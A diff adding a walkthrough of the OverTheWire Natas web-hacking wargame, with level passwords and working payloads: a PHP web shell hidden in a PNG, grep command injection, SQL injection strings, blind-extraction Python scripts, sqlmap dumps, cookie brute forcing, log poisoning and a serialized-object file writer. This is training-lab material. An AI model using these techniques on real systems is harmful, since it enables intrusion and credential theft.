@@ -1,0 +1,771 @@
+Natas0:
+go to http://natas0.natas.labs.overthewire.org
+Ctrl+U to read source code
+<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
+password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
+
+
+Natas1:
+Ctrl+U again
+password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
+
+
+Natas2:
+If you inspect the source code, you see a pixel in /files/pixel.png
+go to http://natas2.natas.labs.overthewire.org/files
+the flag is in http://natas2.natas.labs.overthewire.org/files/user.txt
+password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+
+
+Natas3:
+Ctrl+U and you see
+<!-- No more information leaks!! Not even Google will find it this time... -->
+so we are going to http://natas3.natas.labs.overthewire.org/robots.txt
+User-agent: *
+Disallow: /s3cr3t/
+password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+
+
+Natas4:
+Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+So we send this to Burp Repeater and change the Referer header to "http://natas5.natas.labs.overthewire.org/"
+password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+
+
+Natas5:
+There is a cookie called "login", change its value to 1
+password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+
+
+Natas6:
+View source code and then go to http://natas6.natas.labs.overthewire.org/includes/secret.inc
+password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+
+
+Natas7:
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+the page parameter goes to the specified file on the server. therefore:
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+
+Natas8:
+<?php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+
+we create the function decodeSecret:
+<?php
+function decodeSecret($secret) {
+    return base64_decode(strrev(hex2bin($secret)));
+}
+print decodeSecret($encodedSecret);
+?>
+
+The secret is "oubWYf2kBq"
+password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+
+Natas9:
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+
+so we input something like "a /etc/natas_webpass/natas10", so that we execute
+> grep -i a /etc/natas_webpass/natas10 dictionary.txt
+we get
+password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+
+Natas10:
+same trick work again, we input "a /etc/natas_webpass/natas11".
+password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+
+Natas11:
+we have
+<?
+
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+?>
+
+and the website has the cookie "data", with value $cookie = "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D".
+if we decode base64 decoded it, we get ($cookie XOR $key) = "0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67".
+so we just have to do the operation ($cookie) XOR ($cookie XOR $key) = $key to obtain the $key, which is "KNHL".
+then we change
+$malicious_data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+and print the corresponding encrypted cookie:
+$malicious_cookie = base64_encode(xor_encrypt(json_encode($malicious_data), "KNHL"));
+
+if we base64 decode
+base64 decoded 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-()n67
+password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+
+
+Natas13:
+<?php
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+
+inspecting the source code, we see that we need to modify the extension of the hidden POST request to have ".php" extension
+then we upload a malicious ".php" file
+
+shellcmd.php
+---------------------------------
+<?php system($_GET['cmd']); ?>  |
+---------------------------------
+
+we receive "The file upload/p7ht605awt.php has been uploaded".
+we do
+http://natas12.natas.labs.overthewire.org/upload/a32lyfq18m.php?cmd=cat /etc/natas_webpass/natas13
+password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+
+
+Natas14:
+In this case we have to hide php code in some image file.
+Just get some small size png file for example. I got mc-down.png from github.com/matmarqs/gamedev
+edit it with vim, or append the php code with
+echo "<?php system(\$_GET['cmd']); ?>" >> mc-down.png
+then upload this malicious png image to the server. don't forget to moidify the extension of the POST form to ".php"
+we get "The file upload/snkhtb0ecy.php has been uploaded".
+then we go to
+http://natas13.natas.labs.overthewire.org/upload/snkhtb0ecy.php?cmd=ls
+password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+
+
+Natas15:
+Basic SQL injection. Inspect the source code, and we can enter
+------------------------+
+Username: a" OR 1=1;#   |
+Password: asd           |
+------------------------+
+password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+
+
+Natas16:
+we see that we have a boolean based SQL Injection
+The username=natas16 exists
+If we were to manually do the SQLi, we would insert payloads to discover the password
+username=natas16" and password like "a%"
+
+After playing with sqlmap args a lot, we use the command
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --data="username=natas16" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --string="This user exists" --flush-session --level=5 --risk=3 --proxy="http://127.0.0.1:8080" -D natas15 -T users -C username,password --dump
+
+sqlmap gives us:
+
+Database: natas15
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| bob      | 6P151OntQe                       |
+| charlie  | HLwuGKts2w                       |
+| alice    | hROtsfM734                       |
+| natas16  | TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V |
++----------+----------------------------------+
+
+I also wrote my own SQL Injection script in python:
+----------------------------------------------------------------------------------------------------------------------------------+
+import requests                                                                                                                   |
+                                                                                                                                  |
+url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=True'                                                            |
+headers = {'Host': 'natas15.natas.labs.overthewire.org',                                                                          |
+           'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',                                |
+           'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='}                                     |
+characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"                                                     |
+                                                                                                                                  |
+# like is boolean                                                                                                                 |
+# attempt is the password attempt                                                                                                 |
+def send_payload(attempt, like):                                                                                                  |
+    if like:                                                                                                                      |
+        query = f'password LIKE BINARY "{attempt}%'                                                                               |
+    else:                                                                                                                         |
+        query = f'password = BINARY "{attempt}'                                                                                   |
+    payload = {'username': f'natas16" and {query}'}                                                                               |
+    r = requests.post(url, data=payload, headers=headers)                                                                         |
+    raw = str(r.content)                                                                                                          |
+    return "This user exists." in raw                                                                                             |
+                                                                                                                                  |
+passwd = ""; found = False                                                                                                        |
+while not found:                                                                                                                  |
+    for c in characters:                                                                                                          |
+        correct = send_payload(passwd + c, like=True)                                                                             |
+        print("attempting:", passwd+c)                                                                                            |
+        if correct:                                                                                                               |
+            passwd += c                                                                                                           |
+            print("GOT IT:", passwd)                                                                                              |
+            found = send_payload(passwd, like=False)                                                                              |
+            break                                                                                                                 |
+                                                                                                                                  |
+print("\nThe password is", passwd)                                                                                                |
+----------------------------------------------------------------------------------------------------------------------------------+
+The BINARY is important because SQL queries are case-insensitive by default.
+
+password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+
+Natas17:
+This challenge is very similar to the previous one.
+We have the source code:
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+
+Because $key is between \"\" and they do not permit the characters [;|&`'"], we have to inject commands via $()
+one clever way to do this is
+$(grep ^a /etc/natas_webpass/natas17)zigzag
+
+The 'zigzag' word is in dictionary.txt.
+If the first character of the password is 'a', the command $(grep ^a /etc/natas_webpass/natas17) evaluates to <password>, and the query becomes
+grep -i "<password>zigzag" dictionary.txt
+This would not correspond to any match in the dictionary.
+If the character '^a' is not in the password, the command $(grep ^a /etc/natas_webpass/natas17) evaluates to the empty string, and the query becomes
+grep -i "zigzag" dictionary.txt
+which returns the zigzag word.
+
+Therefore, we make a python script that makes HTTP requests looking for the password.
+I will make use of my previous script, the only difference is that it is no SQL Injection any more. It is a Bash injection. But it still is Boolean based.
+
+dict_request.py
+-----------------------------------------------------------------------------------------------------------------------------------------------------+
+import requests                                                                                                                                      |
+                                                                                                                                                     |
+url = 'http://natas16.natas.labs.overthewire.org/index.php?debug=True'                                                                               |
+# url = http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+a+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search                       |
+headers = { 'Authorization': 'Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=='}                                                       |
+characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"                                                                        |
+                                                                                                                                                     |
+# attempt is the password attempt                                                                                                                    |
+def send_payload(attempt, like):                                                                                                                     |
+    if like:   # regex ^password                                                                                                                     |
+        url = f'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E{attempt}+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search'   |
+    else:      # regex ^password$                                                                                                                    |
+        url = f'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E{attempt}%24+%2Fetc%2Fnatas_webpass%2Fnatas17%29zigzag&submit=Search'|
+    r = requests.get(url, headers=headers)                                                                                                           |
+    raw = str(r.content)                                                                                                                             |
+    return "zigzag" not in raw                                                                                                                       |
+                                                                                                                                                     |
+passwd = ""; found = False                                                                                                                           |
+while not found:                                                                                                                                     |
+    for c in characters:                                                                                                                             |
+        correct = send_payload(passwd + c, like=True)                                                                                                |
+        print("attempting:", passwd+c)                                                                                                               |
+        if correct:                                                                                                                                  |
+            passwd += c                                                                                                                              |
+            print("GOT IT:", passwd)                                                                                                                 |
+            found = send_payload(passwd, like=False)                                                                                                 |
+            break                                                                                                                                    |
+                                                                                                                                                     |
+print("\nThe password is", passwd)                                                                                                                   |
+-----------------------------------------------------------------------------------------------------------------------------------------------------+
+Notice that our program now makes a GET request, but it functions with the same logic.
+
+password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+
+
+Natas18:
+The only differences between this one and Natas15 are the commented lines
+
+if(mysqli_num_rows($res) > 0) {
+    //echo "This user exists.<br>";
+} else {
+    //echo "This user doesn't exist.<br>";
+}
+} else {
+    //echo "Error in query.<br>";
+}
+
+This turns the Boolean based SQL Injection into a Blind Time-based SQL Injection.
+I will not write a script for this, because it seems complicated, but sqlmap will certainly take care of this for us
+
+sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --data="username=natas18" --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --level=5 --risk=3 --proxy="http://127.0.0.1:8080" --dbms=mysql
+
+sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php?debug" --data="username=natas18" --auth-type=Basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --level=5 --risk=3 --proxy="http://127.0.0.1:8080" -D natas17 -T users -C username,password --dump --dbms=mysql
+
+password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+
+Natas19:
+Here we are going to brute force the cookie PHPSESSID with the script
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+#!/bin/bash                                                                                                                                                                                                              |
+                                                                                                                                                                                                                         |
+for i in {0..640}; do                                                                                                                                                                                                    |
+   output=$(curl --path-as-is -i -s -k -X $'GET' -H $'Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==' -b "PHPSESSID=$i" $'http://natas18.natas.labs.overthewire.org/index.php?debug')     |
+   if echo "$output" | grep "The credentials for the next level are" >/dev/null; then                                                                                                                                    |
+      echo "matched. PHPSESSID = $i"                                                                                                                                                                                     |
+      break                                                                                                                                                                                                              |
+   else                                                                                                                                                                                                                  |
+      echo "did not match. PHPSESSID = $i"                                                                                                                                                                               |
+   fi                                                                                                                                                                                                                    |
+done                                                                                                                                                                                                                     |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+we get:
+did not match. PHPSESSID = 116
+did not match. PHPSESSID = 117
+did not match. PHPSESSID = 118
+matched. PHPSESSID = 119
+
+we then just modify the cookie to 119 in firefox
+password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+
+
+Natas20:
+Very similar to the previous one, but we have to think about the pattern of the PHPSESSID cookie. I tried a few regular user logins and grabbed the sample cookies
+-------------------+
+3130332d61646d696e |
+3531372d61646d696e |
+3438312d61646d696e |
+3231372d61646d696e |
+3433382d61646d696e |
+3230362d61646d696e |
+3235322d61646d696e |
+3633322d61646d696e |
+3435302d61646d696e |
+3539342d61646d696e |
+3234322d61646d696e |
+3538312d61646d696e |
+3132332d61646d696e |
+3433332d61646d696e |
+3435332d61646d696e |
+3131352d61646d696e |
+38332d61646d696e   |
+34352d61646d696e   |
+-------------------+
+
+Therefore, I will assume the pattern is "3.3.3.2d61646d696e". I wrote a script to brute force this pattern in python
+---------------------------------------------------------------------------------------------------+
+import requests                                                                                    |
+                                                                                                   |
+url = 'http://natas19.natas.labs.overthewire.org/index.php?debug'                                  |
+headers = { 'Authorization': 'Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==' }    |
+                                                                                                   |
+# index generates a PHPSESSID based on "(?:3.)(?:3.)(?:3.)2d61646d696e" pattern                    |
+def send_payload(index):                                                                           |
+    dig = str(index)                                                                               |
+    if index <= 9:                                                                                 |
+        pattern = f'3{dig[0]}'                                                                     |
+    elif index <= 99:                                                                              |
+        pattern = f'3{dig[0]}3{dig[1]}'                                                            |
+    else:                                                                                          |
+        pattern = f'3{dig[0]}3{dig[1]}3{dig[2]}'                                                   |
+    sessid = f'{pattern}2d61646d696e'                                                              |
+    cookies = { 'PHPSESSID': sessid }                                                              |
+    r = requests.get(url, headers=headers, cookies=cookies)                                        |
+    raw = str(r.content)                                                                           |
+    return "The credentials for the next level are" in raw, sessid                                 |
+                                                                                                   |
+index = 0; found = False                                                                           |
+while not found and index <= 999:                                                                  |
+    match, sessid = send_payload(index)                                                            |
+    if match:                                                                                      |
+        print(f'matched. PHPSESSID = {sessid}')                                                    |
+        found = True                                                                               |
+    else:                                                                                          |
+        print(f'did not match. index = {index}')                                                   |
+        index += 1                                                                                 |
+---------------------------------------------------------------------------------------------------+
+password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+
+
+Natas21:
+In myread() we can see that session file's content is split by using \n (newline) as separator character.
+
+$_SESSION = array();
+foreach(explode("\n", $data) as $line) {
+	debug("Read [$line]");
+	...
+}
+
+Furthermore, to fill the $_SESSION array, each line is expected to be in the form key value
+
+$_SESSION = array();
+foreach(explode("\n", $data) as $line) {
+	...
+	$parts = explode(" ", $line, 2);
+	if($parts[0] != "")
+		$_SESSION[$parts[0]] = $parts[1];
+}
+
+To get authenticated as admin, page checks if session contains the admin key and if its value in 1.
+
+When parameter called name is posted, a new session is initialised and value of name is stored on it (without being sanitised!!!).
+
+we then put on Burp:
+POST /index.php?debug HTTP/1.1
+name=foo%0Aadmin 1
+
+this will create a PHPSESSID and save to the data file
+--------+
+name foo|
+admin 1 |
+--------+
+
+next we make a GET request with this PHPSESSID returned to us
+GET /index.php HTTP/1.1
+Cookie: PHPSESSID=9seaiehjirpnmf3077g756tniu
+
+You are an admin. The credentials for the next level are:
+Username: natas21
+Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+
+password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+
+
+Natas22:
+This one was very easy.
+To get authenticated as admin, page checks if $_SESSION contains the "admin" key and if its value in 1.
+But natas21.experimenter lets us generate a PHPSESSID (delete the cookies first) that contains the keys and values of align, fontsize and bgcolor
+on firefox, we inspect the fiels and just change name="bgcolor" to name="admin" and value="yellow" to value="1"
+this will generate a PHPSESSID. we grab it and go to http://natas21.natas.labs.overthewire.org/index.php
+
+password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
+
+
+Natas23:
+Very easy also.
+The website print credentials if $_SESSION["admin"] = 1 and $_GET("revelio") exists.
+Just make the POST request on Burp
+----------------------------------------------------------------------------------------------------------------
+POST /index.php?revelio HTTP/1.1
+Host: natas22.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyMjo5MWF3Vk05b0RpVUdtMzNKZHpNN1JWTEJTOGJ6OW4wcw==
+Connection: close
+Cookie: PHPSESSID=mbqg9njmbh922jhnm6262mpmn6
+Upgrade-Insecure-Requests: 1
+Content-Length: 7
+
+admin=1
+----------------------------------------------------------------------------------------------------------------
+
+password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj
+
+
+Natas24:
+Just pust
+password=11iloveyou
+because it needs to contain the string "iloveyou" and be greater than "10" in alphabetic order I guess
+password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
+
+
+Natas25:
+Look at Google on how to exploit strcmp on PHP
+https://rst.hashnode.dev/bypassing-php-strcmp
+If we submit an empty array passwd[]=something PHP translates GET variables like this to an empty array which causes strcmp() to barf: strcmp(array(), "token") -> NULL which will return 0
+
+we just go
+http://natas24.natas.labs.overthewire.org/index.php?passwd[]=ash
+password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
+
+
+Natas26:
+
+The things is use "....//" because that will be filtered to "../"
+we can include the log file with ?lang=....//logs/natas25_8vm1kg9qusfinr4a08agkjeeu7.log
+Now, because the log file has
+$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+we use the header User-Agent to inject PHP code like
+User-Agent: <?php global $__MSG; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); ?>
+
+Burp Request
+--------------------------------------------------------------------------------------------------------
+GET /index.php?lang=....//logs/natas25_8vm1kg9qusfinr4a08agkjeeu7.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+User-Agent: <?php global $__MSG; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyNTpPOVFEOURaQkRxMVlwc3dpVE01b3FNRGFPdHVadEFjeA==
+Connection: close
+Cookie: PHPSESSID=8vm1kg9qusfinr4a08agkjeeu7
+Upgrade-Insecure-Requests: 1
+--------------------------------------------------------------------------------------------------------
+
+password: 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
+
+
+Natas27:
+
+this one is a little difficult, because you need to know about the construct and deconstruct of a class
+and that this will be executed on the $drawing cookie
+check out https://n0j.github.io/2017/07/19/otw-natas-26.html
+
+we cook a cookie with the code:
+
+----------------------------------------------------------------------------------------------------------------------
+<?php
+
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct(){
+        $this->initMsg="heyyyyyy\n";
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
+        $this->logFile = "/var/www/natas/natas26/img/teste123.php";
+    }
+}
+
+$o = new Logger();
+print base64_encode(serialize($o))."\n";
+?>
+----------------------------------------------------------------------------------------------------------------------
+
+password: PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3
+
+
+Natas28:
+
+Basically, we have a MySQL database with usernames and passwords.
+
+The thing is, when creating a user, the code uses checks
+if($usr != trim($usr)) {
+    echo "Go away hacker";
+    return False;
+}
+but it creates a substring of the string $usr with
+substr($usr, 0, 64)
+if we input a user like
+$usr = "natas28                                                         a"
+which has 65 characters, the condition ($usr != trim($usr)) is false because there are no whitespace on the right or left
+therefore, it will not print "Go away hacker" and we are able to create a user.
+but the user created will have a username with 64 characters like
+$username = "natas28                                                         "
+the 'a' character will be discarded.
+now we can log in with this new user
+$username = "natas28                                                         "
+the only function that check ($usr != trim($usr)) is the createUser
+this is a valid user and function validUser will return true
+the function checkCredentials will also return true because it is a legitimate user with password
+but the function dumpData trims the user again!
+therefore it will dump not the password of
+"natas28                                                         "
+but the password of
+"natas28"
+
+-------------------------------------------------------------------------------------------------------------
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);
+    $password=mysqli_real_escape_string($link, $pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysqli_query($link, $query);
+    if(mysqli_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    if($usr != trim($usr)) {
+        echo "Go away hacker";
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if(mysqli_affected_rows($link) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas27', '<censored>');
+    mysqli_select_db($link, 'natas27');
+
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    }
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysqli_close($link);
+} else {
+?>
+-------------------------------------------------------------------------------------------------------------
+password: skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4
+
+
+Natas29:
+
+This is SQL Injection, but it has some cryptography.
